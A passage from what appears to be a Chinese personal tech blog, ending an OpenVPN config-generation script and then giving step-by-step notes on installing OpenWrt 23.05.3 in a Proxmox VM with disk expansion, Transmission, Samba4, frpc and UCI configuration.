class=\"line\"><span class=\"string\">&lt;ca&gt;$&#123;NL&#125;$&#123;CA_CERT&#125;$&#123;NL&#125;&lt;/ca&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;cert&gt;$&#123;NL&#125;$&#123;VPN_CERT&#125;$&#123;NL&#125;&lt;/cert&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;key&gt;$&#123;NL&#125;$&#123;VPN_KEY&#125;$&#123;NL&#125;&lt;/key&gt;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\">  <span class=\"built_in\">chmod</span> <span class=\"string\">&quot;u=rw,g=,o=&quot;</span> <span class=\"string\">&quot;<span class=\"variable\">$&#123;VPN_CONF&#125;</span>&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">ls</span> /etc/openvpn/*.ovpn</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://vpn.shu.edu.cn/index/OpenVPNsysm/Android.htm\">安卓版 OpenVPN 的下载地址</a></li>\n<li><a href=\"https://lolicp.com/linux/202326135.html\">Centos7 上 OpenVPN 2.6服务安装部署</a></li>\n<li><a href=\"http://minglog.hzbmmc.com/2023/09/20/Centos7%E4%BD%BF%E7%94%A8OpenVPN%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/\">Centos7 使用 OpenVPN 实现内网穿透和代理服务</a></li>\n<li><a href=\"https://www.gaoyufu.cn/archives/openvpn\">阿里云 ECS上 搭建 OpenVPN 服务器</a></li>\n<li><a href=\"https://fcors.com/openvpn%E7%9A%84server-conf%E5%92%8Cclient-conf%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/\">openvpn（二）的 server.conf 和 client.conf 详细解析</a></li>\n<li><a href=\"https://luoweihua.cn/129.html\">解决 OpenVPN 客户端所有网络全走 VPN 的问题</a></li>\n<li><a href=\"https://github.com/OpenVPN/openvpn/blob/master/README.dco.md\">DCO 配置说明</a></li>\n</ul>\n<h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"https://community.openvpn.net/openvpn/wiki/Downloads\">OpenVPN 官方下载</a></li>\n<li><a href=\"https://github.com/OpenVPN/openvpn/releases\">OpenVPN Github 下载</a></li>\n<li><a href=\"https://openvpn.net/client/\">OpenVPN Client UI</a></li>\n<li><a href=\"https://github.com/OpenVPN/openvpn/blob/master/sample/sample-config-files/client.conf\">Client 配置文件</a></li>\n<li><a href=\"https://github.com/OpenVPN/openvpn/blob/master/sample/sample-config-files/server.conf\">Server 配置文件</a></li>\n<li><a href=\"https://openvpn.net/community-resources/how-to/#examples\">OpenVPN 操作方法</a></li>\n</ul>\n"},{"title":"OpenWrt 安装笔记","url":"/2025/01/11/OpenWrt-%E5%AE%89%E8%A3%85%E7%AC%94%E8%AE%B0/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p><a href=\"https://openwrt.org/\">OpenWrt</a> 是一个为嵌入式设备（通常是无线路由器）开发的高扩展度的 GNU&#x2F;Linux 发行版。与许多其他路由器的发行版不同，OpenWrt 是一个完全为嵌入式设备构建的功能全面、易于修改、由现代 Linux 内核驱动的操作系统。在实践中，这意味着您可以得到需要的所有功能，却仍能避免臃肿。</p>\n<blockquote>\n<p>LEDE（Linux Embedded Development Environment）曾经是 OpenWrt 的一个分支项目，2018 年合并后的项目使用 OpenWrt 的名字、LEDE的源代码。</p>\n</blockquote>\n<h3 id=\"1-基线版本\"><a href=\"#1-基线版本\" class=\"headerlink\" title=\"1. 基线版本\"></a>1. 基线版本</h3><p>OpenWrt 的版本序列参见：<a href=\"https://downloads.openwrt.org/releases/\">https://downloads.openwrt.org/releases/</a>，当前稳定版是 23.05，本文的基线版本是 2024 年 5 月发布的 23.05.3。</p>\n<p>OpenWrt 是为嵌入式设备设计的，其支持的 CPU 架构非常广泛，甚至树莓派等低端设备都可以，本文采用 PVE 虚拟机安装，当然就是 x86-64 了，基础镜像为：<a href=\"https://downloads.openwrt.org/releases/23.05.3/targets/x86/64\">openwrt-23.05.3-x86-64-generic-ext4-combined.img</a>，采用 ext4 文件系统便于后续扩容。</p>\n<blockquote>\n<p>Squashfs 是一个<strong>开源、只读、压缩</strong>的文件系统，常被用于 Linux 发行版的 LiveCD 中。</p>\n</blockquote>\n<h3 id=\"2-opkg-包管理器\"><a href=\"#2-opkg-包管理器\" class=\"headerlink\" title=\"2. opkg 包管理器\"></a>2. opkg 包管理器</h3><p>OpenWrt 的软件包管理工具是 opkg，功能与 dpkg 基本一致，其软件仓库大约有 3500 个包。<br>opkg 系统源的配置文件：<code>/etc/opkg/distfeeds.conf</code>，默认指向<a href=\"https://downloads.openwrt.org/releases/23.05.3/packages/x86_64\">https://downloads.openwrt.org</a><br>手工替换为阿里云的镜像源，以加快软件安装速度。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sed -i <span class=\"string\">&#x27;s_downloads.openwrt.org_mirrors.aliyun.com/openwrt_&#x27;</span> /etc/opkg/distfeeds.conf</span><br></pre></td></tr></table></figure>\n\n<p>处理结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">src/gz openwrt_core https://mirrors.aliyun.com/openwrt/releases/23.05.3/targets/x86/64/packages</span><br><span class=\"line\">src/gz openwrt_base https://mirrors.aliyun.com/openwrt/releases/23.05.3/packages/x86_64/base</span><br><span class=\"line\">src/gz openwrt_luci https://mirrors.aliyun.com/openwrt/releases/23.05.3/packages/x86_64/luci</span><br><span class=\"line\">src/gz openwrt_packages https://mirrors.aliyun.com/openwrt/releases/23.05.3/packages/x86_64/packages</span><br><span class=\"line\">src/gz openwrt_routing https://mirrors.aliyun.com/openwrt/releases/23.05.3/packages/x86_64/routing</span><br><span class=\"line\">src/gz openwrt_telephony https://mirrors.aliyun.com/openwrt/releases/23.05.3/packages/x86_64/telephony</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>清华源似乎有点问题，PassWall 安装时有兼容性问题</p>\n</blockquote>\n<h3 id=\"3-LuCI-Lua-UCI\"><a href=\"#3-LuCI-Lua-UCI\" class=\"headerlink\" title=\"3. LuCI &#x3D; Lua + UCI\"></a>3. LuCI &#x3D; Lua + UCI</h3><p><a href=\"https://openwrt.org/zh/docs/guide-user/base-system/uci\">UCI（Unified Configuration Interface）</a>是 Openwrt 中为实现所有系统配置的统一配置接口，只包括一个精简的核心和最基本的库，体积小、启动速度快，意在 实现 OpenWrt 整个系统的配置集中化。<br>LuCI 是一个使用 Lua 语言开发的 Web UI，采用 MVC 三层架构，提供 OpenWrt 的系统管理功能。<br>LuCI 的统一配置文件目录：<code>/etc/config/</code>，登录方式为 <code>http://&lt;LAN IP&gt;:80</code>。</p>\n<h2 id=\"二、基础系统安装\"><a href=\"#二、基础系统安装\" class=\"headerlink\" title=\"二、基础系统安装\"></a>二、基础系统安装</h2><p>准备好基础镜像后，就可以创建一个虚拟机准备安装了。</p>\n<h3 id=\"1-VM-准备\"><a href=\"#1-VM-准备\" class=\"headerlink\" title=\"1. VM 准备\"></a>1. VM 准备</h3><p>建议配置 1C + 1G、默认硬盘（无所谓，后面会删除）、默认 Lan 端口（因为是旁路无需增加 Wan 端口）。</p>\n<ul>\n<li>将基础镜像 SCP 到 node（OpenWrt默认不支持 sftp）的目录空间</li>\n<li>登录 node 的 Shell，加载基础镜像磁盘（展开后约 124 MB）<br>  <code>qm importdisk &lt;VM ID&gt; &lt;Img Filename&gt; local-lvm</code></li>\n<li>删除 CDROM 和默认硬盘；加载镜像盘并<strong>适当扩容</strong>（建议 1GB）；</li>\n<li>注意检查 <strong>Boot Order</strong>，确保从镜像硬盘启动！</li>\n</ul>\n<p>现在启动 VM，如果一切正常就可以从 Console 登录了。<br>建议替换 opkg 的软件源为国内镜像，以加快后续安装速度</p>\n<h3 id=\"2-网络配置\"><a href=\"#2-网络配置\" class=\"headerlink\" title=\"2. 网络配置\"></a>2. 网络配置</h3><p>新系统初次启动后，通过 <code>ip a</code> 查看网络状态，默认状态为：</p>\n<ul>\n<li>lo：本地还回地址，127.0.0.1&#x2F;8</li>\n<li>eth0：默认物理网口，实际指向<code>br-lan</code></li>\n<li>br-lan：本地网桥接口，默认地址为<code>192.168.1.1</code>。</li>\n</ul>\n<p>为了防止 IP 地址冲突，通常需要修改 <code>/etc/config/network</code> 配置文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">config interface &#x27;lan&#x27;</span><br><span class=\"line\">    option device &#x27;br-lan&#x27;</span><br><span class=\"line\">    option proto &#x27;dhcp&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>最后，就是重启网络服务了！</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">service network restart</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-磁盘扩容\"><a href=\"#3-磁盘扩容\" class=\"headerlink\" title=\"3. 磁盘扩容\"></a>3. 磁盘扩容</h3><p>如果系统硬盘做了扩容，启动后磁盘信息如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Device     Boot  Start     End Sectors  Size Id Type</span><br><span class=\"line\">/dev/sda1  *       512   33279   32768   16M 83 Linux</span><br><span class=\"line\">/dev/sda2        33792  246783  212992  104M 83 Linux</span><br><span class=\"line\">/dev/sda3       247808 2351103 2103296    1G 83 Linux</span><br></pre></td></tr></table></figure>\n\n<p>其中，<code>/dev/sda1</code> 是 Boot 引导盘，<code>/dev/sda2</code>是系统盘，<code>/dev/sda3</code>是新增但尚未使用的磁盘空间。</p>\n<ol>\n<li>安装工具软件：<code>opkg install parted fdisk block-mount blockdev</code></li>\n<li>使用 <code>fdisk /dev/sda</code> 新增一个分区：m-帮助、p-列出、n-新增、w-存盘退出！</li>\n<li>使用 <code>mkfs.ext4 /dev/sda3</code> 将新分区格式化为 ext4 文件系统</li>\n<li>通过 overlay 文件系统，以<strong>叠加</strong>方式完成 root 文件系统扩容</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">DEVICE=<span class=\"string\">&quot;/dev/sda3&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span> $(block info <span class=\"string\">&quot;<span class=\"variable\">$&#123;DEVICE&#125;</span>&quot;</span> | grep -o -e <span class=\"string\">&quot;UUID=\\S*&quot;</span>)</span><br><span class=\"line\">uci -q delete fstab.overlay</span><br><span class=\"line\">uci <span class=\"built_in\">set</span> fstab.overlay=<span class=\"string\">&quot;mount&quot;</span></span><br><span class=\"line\">uci <span class=\"built_in\">set</span> fstab.overlay.uuid=<span class=\"string\">&quot;<span class=\"variable\">$&#123;UUID&#125;</span>&quot;</span></span><br><span class=\"line\">uci <span class=\"built_in\">set</span> fstab.overlay.target=<span class=\"string\">&quot;/overlay&quot;</span></span><br><span class=\"line\">uci commit fstab</span><br></pre></td></tr></table></figure>\n\n<p>最后，文件系统是如下形式，也可以通过 Web GUI 的 system - Mount Points 页面查看。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Filesystem                Size      Used Available Use% Mounted on</span><br><span class=\"line\">/dev/root               102.3M     18.7M     81.5M  19% /rom</span><br><span class=\"line\">tmpfs                   493.2M      1.0M    492.2M   0% /tmp</span><br><span class=\"line\">/dev/sda3               976.3M      8.6M    900.4M   1% /overlay</span><br><span class=\"line\">overlayfs:/overlay      976.3M      8.6M    900.4M   1% /</span><br><span class=\"line\">/dev/sda1                15.7M      5.5M      9.8M  36% /boot</span><br><span class=\"line\">/dev/sda1                15.7M      5.5M      9.8M  36% /boot</span><br><span class=\"line\">tmpfs                   512.0K         0    512.0K   0% /dev</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"新建磁盘（可选）\"><a href=\"#新建磁盘（可选）\" class=\"headerlink\" title=\"新建磁盘（可选）\"></a>新建磁盘（可选）</h4><p>对于一个新增磁盘（例如<code>/dev/sdb</code>），基本的处理流程也类似，但注意目标磁盘不同！</p>\n<ol>\n<li>使用 <code>fdisk /dev/sdb</code> 新增一个分区：m-帮助、p-列出、n-新增、w-存盘退出！</li>\n<li>使用 <code>mkfs.ext4 /dev/sdb1</code> 将新分区格式化为 ext4 文件系统</li>\n<li>直接编辑 <code>/etc/config/fstab</code> 增加如下段落，然后重启即可！</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">config mount</span><br><span class=\"line\">    option target &#x27;/mnt&#x27;</span><br><span class=\"line\">    option device &#x27;/dev/sdb1&#x27;</span><br><span class=\"line\">    option fstype ext4</span><br><span class=\"line\">    option options rw,sync</span><br><span class=\"line\">    option enabled 1</span><br><span class=\"line\">    option enable_fsck 0</span><br></pre></td></tr></table></figure>\n\n<p>这一步也可通过 LuCI 的 system - Mount Points 页面的 Mount Points 段落的 Add 按钮进行编辑</p>\n<h3 id=\"4-其他配置\"><a href=\"#4-其他配置\" class=\"headerlink\" title=\"4. 其他配置\"></a>4. 其他配置</h3><p>OpenWrt 安装启动后，许多操作就可以通过 LuCI 操作了。</p>\n<h4 id=\"启用系统时间服务\"><a href=\"#启用系统时间服务\" class=\"headerlink\" title=\"启用系统时间服务\"></a>启用系统时间服务</h4><p>System - System 页面，点击 System Properties 段落的 Time Synchronization 标签：</p>\n<ul>\n<li>Enable NTP Client：开关</li>\n<li>Provide NTP Server：开关</li>\n<li>Bind NTP server：绑定 ntpd 服务的网络端口</li>\n<li>Use DHCP adertised servers：开关</li>\n<li>NTP Server candidates：上游时间服务器列表</li>\n</ul>\n<h4 id=\"设置时区\"><a href=\"#设置时区\" class=\"headerlink\" title=\"设置时区\"></a>设置时区</h4><p>System - System 页面，点击 System Properties 段落的 General Settings 标签：</p>\n<ul>\n<li>TimeZone：Aisa&#x2F;Shanghai；点击 Save &amp; Apply 生效</li>\n</ul>\n<h4 id=\"关闭-DHCP-服务\"><a href=\"#关闭-DHCP-服务\" class=\"headerlink\" title=\"关闭 DHCP 服务\"></a>关闭 DHCP 服务</h4><p>Network - DHCP and DNS 页面，点击 CFG01411C 段落的 General 便签：</p>\n<ul>\n<li>Authoritative：取消勾选，不提供 DHCP 服务；点击 Save &amp; Apply 生效</li>\n</ul>\n<blockquote>\n<p>23.05.3 更新了 DHCP 的管理页，现在可以管理多个 Dnsmasq 实例<br>CFG01411C 是缺省名称，查看 ps w ｜grep dnsmasq</p>\n</blockquote>\n<h2 id=\"三、Transmission-部署\"><a href=\"#三、Transmission-部署\" class=\"headerlink\" title=\"三、Transmission 部署\"></a>三、Transmission 部署</h2><ol>\n<li><p>安装软件包</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">opkg update</span><br><span class=\"line\">opkg install luci-app-transmission transmission-web</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>刷新 LuCI 界面，将新增出现 Service - Transmission 菜单；<br> 编辑如下字段，Save &amp; Apply 保存并应用配置信息</p>\n<ul>\n<li><strong>Enabled</strong>：勾选。</li>\n<li>Run daemon as user &amp; Run daemon as group：修改 transmission -&gt; root。不为权限烦恼！</li>\n<li>Config file directory：默认 &#x2F;tmp&#x2F;transmission。加挂磁盘后再次修改！</li>\n<li>Download directory：默认 &#x2F;tmp&#x2F;transmission&#x2F;done。加挂磁盘后再次修改，这也是以后的共享目录！</li>\n<li>Incomplete directory enabled：默认取消。没啥好处</li>\n<li>Cache size in MB：默认 2M</li>\n</ul>\n</li>\n<li><p>手工启动 transmission 服务</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">service transmission start</span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>现在可以打开 Transmission 管理界面：<code>http://&lt;LAN IP&gt;:9091</code>。软件安装已完成！<br>现在下载数据目录<code>/tmp/transmission/</code> 的内容如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">drwxr-xr-x    2 root     root          4096 Jan 12 02:29 blocklists</span><br><span class=\"line\">drwxr-xr-x    2 root     root          4096 Jan 12 02:29 done</span><br><span class=\"line\">drwxr-xr-x    2 root     root          4096 Jan 12 02:29 resume</span><br><span class=\"line\">-rw-r--r--    1 root     root          1355 Jan 12 02:29 settings.json</span><br><span class=\"line\">-rw-r--r--    1 root     root             0 Jan 12 02:29 stats.json</span><br><span class=\"line\">drwxr-xr-x    2 root     root          4096 Jan 12 02:29 torrents</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"后续调整磁盘\"><a href=\"#后续调整磁盘\" class=\"headerlink\" title=\"后续调整磁盘\"></a>后续调整磁盘</h3><p>后续使用时需要大容量磁盘，处理步骤包括：</p>\n<ol>\n<li>为 VM 添加磁盘</li>\n<li>对新增磁盘建立分区、格式化文件系统、设置 fstab</li>\n<li>进入 Transmission 配置页面，将下载目录调整到磁盘挂载目录<code>/mnt/transmission/</code></li>\n<li>重启 Transmission 服务</li>\n</ol>\n<h2 id=\"四、Samba4-部署\"><a href=\"#四、Samba4-部署\" class=\"headerlink\" title=\"四、Samba4 部署\"></a>四、Samba4 部署</h2><ol>\n<li><p>安装软件包</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">opkg update</span><br><span class=\"line\">opkg luci-app-samba4</span><br></pre></td></tr></table></figure>\n\n<p> 如果是挂载其他文件系统格式的硬盘，需要安装相应的软件驱动：<br> <code>opkg install kmod-fs-ext4 kmod-fs-exfat kmod-fs-ntfs3</code><br> 如果挂载是通过 USB 外接硬盘，还需要安装相关 USB 驱动和模块：<br> <code>opkg install kmod-usb3 kmod-usb-storage-uas usbutils block-mount mount-utils luci-app-hd-idle</code></p>\n</li>\n<li><p>软件包安装成功后，LuCI 新增 Services - Network Shares 菜单。</p>\n<ul>\n<li>Interface：选择提供服务的网络端口</li>\n<li>Enable extra Tuning：建议勾选</li>\n<li>Enable macOS compatible shares：建议勾选</li>\n<li>Shared Directories 段落：共享目录管理，按需要操作即可。建议勾选 Force Root 简化权限问题。</li>\n</ul>\n</li>\n<li><p>无需手工处理，samba4 服务已经启动，现在可以发现网络共享目录了！</p>\n</li>\n</ol>\n<h2 id=\"五、Frp-部署\"><a href=\"#五、Frp-部署\" class=\"headerlink\" title=\"五、Frp 部署\"></a>五、Frp 部署</h2><ol>\n<li><p>安装软件包。frpc 是客户端软件，也可以根据需要安装服务端软件 frps。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">opkg update</span><br><span class=\"line\">opkg install luci-app-frpc</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>软件包安装成功后，LuCI 新增 Services -frp client 菜单。</p>\n<ul>\n<li>Server address：服务端域名或 IP 地址</li>\n<li>Server port：服务端的管理端口号</li>\n<li>Token：服务端的鉴权凭证</li>\n<li>Proxy Settings 段落：代理服务设置，支持 tcp udp http https stcp xtcp 等类型</li>\n</ul>\n</li>\n<li><p>无需手工启动服务，但如果服务端配置错误，frpc 服务将不可见。</p>\n</li>\n</ol>\n<h2 id=\"六、Passwall-部署\"><a href=\"#六、Passwall-部署\" class=\"headerlink\" title=\"六、Passwall 部署\"></a>六、Passwall 部署</h2><p>本文略，如有兴趣可以参见<a href=\"https://www.rultr.com/tutorials/68311.html\">OpenWrt 官方固件安装使用 passwall 详解</a>。<br>注意需要通过 SCP 拷贝 ipk 文件，并在本地手工安装。</p>\n<h2 id=\"七、简要分析\"><a href=\"#七、简要分析\" class=\"headerlink\" title=\"七、简要分析\"></a>七、简要分析</h2><p>以 Transmission 安装包为例，对 OpenWrt 技术特点做个简要分析。先说结论：</p>\n<ol>\n<li>OpenWrt 软件安装应选择 <code>luci-app-xxx</code> 的安装包，其不仅包含了软件的基础功能，并通过 UCI 统一配置接口支持 LuCI 界面配置。</li>\n<li>应用安装后，不要按照 Linux 习惯去 &#x2F;etc&#x2F;xxx 目录管理配置，现在都在 &#x2F;etc&#x2F;config&#x2F; 目录集中管理。</li>\n<li>系统服务管理是传统的 Server 模式，不是现代的 Systemd 模式。</li>\n<li>LuCI 界面的汉化语言包命名为 <code>luci-i18n-xxx-zh-cn</code>，不建议安装，原文更准确！</li>\n</ol>\n<p><code>luci-app-transmission</code> 是 Transmission 在 OpenWrt 的软件包名称，分析其构成。<br>一是有 2 个底层依赖包，分别是 transmission-deamon 和 libc；<br>二是自带 3 个文件，其实是 LuCI 定制菜单 Service-Transmission 的配置信息。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@OpenWrt:~# opkg info luci-app-transmission</span><br><span class=\"line\">Package: luci-app-transmission</span><br><span class=\"line\">Version: git-24.364.71483-75d2b84</span><br><span class=\"line\">Depends: libc, transmission-daemon                                  # 2个依赖包</span><br><span class=\"line\">Status: install user installed</span><br><span class=\"line\">Section: luci</span><br><span class=\"line\">Architecture: all</span><br><span class=\"line\">Size: 3807</span><br><span class=\"line\">Filename: luci-app-transmission_git-24.364.71483-75d2b84_all.ipk    # 实际 ipk 文件名</span><br><span class=\"line\">Description: LuCI Support for Transmission</span><br><span class=\"line\">Installed-Time: 1736645046</span><br><span class=\"line\"></span><br><span class=\"line\">root@OpenWrt:~# opkg files luci-app-transmission</span><br><span class=\"line\">Package luci-app-transmission (git-24.364.71483-75d2b84) is installed on root and has the following files:</span><br><span class=\"line\">/www/luci-static/resources/view/transmission.js                     # LuCI 的定制 UI </span><br><span class=\"line\">/usr/share/rpcd/acl.d/luci-app-transmission.json</span><br><span class=\"line\">/usr/share/luci/menu.d/luci-app-transmission.json</span><br></pre></td></tr></table></figure>\n\n<p>继续分析<code>transmission-daemon</code> ，这是 Transmission 提供的，与其他 Linux 系统的软件包完全一致。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@OpenWrt:~# opkg files transmission-daemon</span><br><span class=\"line\">Package transmission-daemon (4.0.6-1) is installed on root and has the following files:</span><br><span class=\"line\">/etc/seccomp/transmission-daemon.json       # 系统服务参数</span><br><span class=\"line\">/etc/init.d/transmission                    # 系统启动脚本</span><br><span class=\"line\">/etc/sysctl.d/20-transmission.conf          # 环境参数配置文件</span><br><span class=\"line\">/usr/bin/transmission-daemon                # 二进制代码</span><br><span class=\"line\">/etc/config/transmission                    # 应用参数配置文件</span><br></pre></td></tr></table></figure>\n\n<p>至于<code>libc</code>就没啥说的了，这是更基础的 Linux 系统提供的动态链接库。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@OpenWrt:~# opkg files libc</span><br><span class=\"line\">Package libc (1.2.4-4) is installed on root and has the following files:</span><br><span class=\"line\">/lib/ld-musl-x86_64.so.1                    # 软链接，用于动态连接库的版本控制</span><br><span class=\"line\">/lib/libc.so                                # 动态连接库</span><br><span class=\"line\">/usr/bin/ldd                                # 二进制代码，用于判断某个 binary 档案含有什么动态函式库</span><br></pre></td></tr></table></figure>\n\n<p>此外，Transmisson 还提供了几个可选软件包：</p>\n<ul>\n<li>transmission-web：必选。标准的下载管理 UI 界面。</li>\n<li>transmission-web-control：与 transmission-web 互斥。另一个下载管理 UI 界面，信息更丰富。</li>\n<li>transmission-cli：可选。命令行工具。</li>\n<li>transmission-remote：可选。远程操作组件。</li>\n</ul>\n<hr>\n<h2 id=\"附录一：UCI-统一配置接口\"><a href=\"#附录一：UCI-统一配置接口\" class=\"headerlink\" title=\"附录一：UCI 统一配置接口\"></a>附录一：UCI 统一配置接口</h2><p>UCI 的统一配置文件目录：<code>/etc/config/</code>，每个系统服务都有一个相应的配置文件。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">配置文件名</th>\n<th align=\"center\">服务描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;dhcp</td>\n<td align=\"center\">dnsmasq和DHCP的配置</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;dropbear</td>\n<td align=\"center\">SSH服务的替代品</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;firewall</td>\n<td align=\"center\">Linux系统防火墙配置</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;network</td>\n<td align=\"center\">本机网络接口和路由配置</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;system</td>\n<td align=\"center\">杂项与系统配置</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;wireless</td>\n<td align=\"center\">无线接口设置和无线网络定义</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;fstab</td>\n<td align=\"center\">挂载点及swap</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;luci</td>\n<td align=\"center\">基础 LuCI 配置</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;mountd</td>\n<td align=\"center\">OpenWrt 自动挂载进程(类似autofs)</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;samba</td>\n<td align=\"center\">samba配置(Microsoft文件共享)</td>\n</tr>\n<tr>\n<td align=\"left\">&#x2F;etc&#x2F;config&#x2F;transmission</td>\n<td align=\"center\">BitTorrent配置</td>\n</tr>\n</tbody></table>\n<p>所有系统服务清单及其作用，参见<a href=\"https://openwrt.org/zh/docs/guide-user/base-system/uci\">OpenWrt UCI 系统</a>。</p>\n<h3 id=\"配置文件的语法\"><a href=\"#配置文件的语法\" class=\"headerlink\" title=\"配置文件的语法\"></a>配置文件的语法</h3><p>以<code>/etc/config/network</code>为例，其语法形式包括：</p>\n<ul>\n<li>config：表示当前节点（section）</li>\n<li>option：表示节点的一个元素（key-value），建议使用<strong>单引号</strong>包裹 value</li>\n<li>list：表示列表（list）形式的一组参数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">config interface &#x27;loopback&#x27;</span><br><span class=\"line\">    option device &#x27;lo&#x27;</span><br><span class=\"line\">    option proto &#x27;static&#x27;</span><br><span class=\"line\">    option ipaddr &#x27;127.0.0.1&#x27;</span><br><span class=\"line\">    option netmask &#x27;255.0.0.0&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">config globals &#x27;globals&#x27;</span><br><span class=\"line\">    option ula_prefix &#x27;fdfc:4d51:93dd::/48&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">config device</span><br><span class=\"line\">    option name &#x27;br-lan&#x27;</span><br><span class=\"line\">    option type &#x27;bridge&#x27;</span><br><span class=\"line\">    list ports &#x27;eth0&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">config interface &#x27;lan&#x27;</span><br><span class=\"line\">    option device &#x27;br-lan&#x27;</span><br><span class=\"line\">    option proto &#x27;dhcp&#x27;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"配置文件的操作\"><a href=\"#配置文件的操作\" class=\"headerlink\" title=\"配置文件的操作\"></a>配置文件的操作</h3><p>uci 是 UCI 的命令行工具，提供 add set get show delete rename commit 等操作方法。<br>例如，磁盘扩容的几个命令行，换个角度看就是去处理 <code>/etc/config/fstab</code> 文件，其结果如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">config global</span><br><span class=\"line\">    option anon_swap &#x27;0&#x27;</span><br><span class=\"line\">    option anon_mount &#x27;0&#x27;</span><br><span class=\"line\">    option auto_swap &#x27;1&#x27;</span><br><span class=\"line\">    option auto_mount &#x27;1&#x27;</span><br><span class=\"line\">    option delay_root &#x27;5&#x27;</span><br><span class=\"line\">    option check_fs &#x27;0&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">config mount</span><br><span class=\"line\">    option target &#x27;/boot&#x27;</span><br><span class=\"line\">    option uuid &#x27;84173db5-fa99-e35a-95c6-28613cc79ea9&#x27;</span><br><span class=\"line\">    option enabled &#x27;0&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">config mount</span><br><span class=\"line\">    option target &#x27;/&#x27;</span><br><span class=\"line\">    option uuid &#x27;ff313567-e9f1-5a5d-9895-3ba130b4a864&#x27;</span><br><span class=\"line\">    option enabled &#x27;0&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">config mount &#x27;overlay&#x27;</span><br><span class=\"line\">    option uuid &#x27;70bbf914-80d7-455c-810a-fa19c6ed50a3&#x27;</span><br><span class=\"line\">    option target &#x27;/overlay&#x27;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"系统服务的启动\"><a href=\"#系统服务的启动\" class=\"headerlink\" title=\"系统服务的启动\"></a>系统服务的启动</h3><p>OpenWrt 软件包一般采用 UCI 模式管理，通常是以 <code>luci-app-xxx</code> 形式命名的软件包，其典型启动流程为：</p>\n<ol>\n<li>启动脚本 <code>/etc/init.d/samba</code>，或者 <code>serive samba &lt;start|stop|restart|enable|disable&gt;</code></li>\n<li>启动脚本通过 UCI 分析库从 <code>/etc/config/samba</code> 获得启动参数</li>\n<li>应用启动脚本完成正常启动</li>\n</ol>\n<p>service 命令的执行过程实际上就是操作<code>/etc/init.d/</code>目录下的初始化脚本，这是传承自 System V 的标准风格。<br>值得一提的是，比<code>/etc/init.d/</code>优先级更高的是<code>/etc/rc[0..6].d/</code> 目录，其设定了不同级别的启动脚本，这也是 